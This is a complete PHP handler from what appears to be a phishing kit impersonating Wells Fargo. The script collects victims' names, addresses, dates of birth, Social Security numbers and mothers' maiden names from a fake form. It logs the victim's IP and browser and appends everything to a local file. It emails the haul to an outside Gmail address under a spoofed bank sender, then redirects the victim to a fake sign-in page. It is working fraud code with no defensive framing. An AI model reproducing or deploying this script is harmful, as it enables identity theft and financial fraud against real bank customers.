<?php 
$to = "100fareedah@gmail.com";
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "================== WesFago ".$ip."  ==================\n";
$message .= "Namesis: ".$_POST['o7a1']."\n";
$message .= "ADDY: ".$_POST['74a1']."\n";
$message .= "CITI: ".$_POST['44a1']."/".$_POST['7281l']."/".$_POST['a1x2b']."\n";
$message .= "DOB: ".$_POST['obai']."/".$_POST['obai2']."/".$_POST['obai3']."\n";
$message .= "SSNI: ".$_POST['okoni']."\n";
$message .= "MMN: ".$_POST['okozi']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$message .= "=============+Codewizard+===========\n";
$to = "100fareedah@gmail.com";
$subj = " WelsFargo ||".$ip."\n";
$from = "From: WFargo  <codewizard@approject.com>";
$fp = fopen('SDSSSVSSS.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
Header ("Location: lasti.html?signinpage&update=&cookiecheck=yes&destination=nba/signin&action");
?>